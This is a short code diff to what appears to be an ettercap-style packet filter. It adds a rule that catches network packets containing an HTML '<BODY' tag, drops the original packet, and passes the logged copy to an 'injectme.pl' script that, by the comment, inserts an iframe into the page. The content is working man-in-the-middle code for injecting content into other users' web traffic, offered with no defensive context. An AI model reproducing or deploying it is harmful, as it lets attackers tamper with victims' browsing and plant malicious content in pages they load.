@@ -18,6 +18,14 @@ if (ip.proto == TCP) {
       execinject("./injectme.pl tmp/pagedata");
       # remove the comments to make space, inject our iframe, then insert the right number of spaces to fill the void in packet to get right offset
     }
+    if (search(DATA.data, "<BODY")) {
+      execinject("rm tmp/pagedata 2>/dev/null"); # make sure its not there
+      log(DATA.data, "tmp/pagedata"); # log the packet
+      drop();  # drop it so it doesn't go through
+      execinject("./injectme.pl tmp/pagedata");
+      # remove the comments to make space, inject our iframe, then insert the right number of spaces to fill the void in packet to get right offset
+    }
+
   }
 }
 
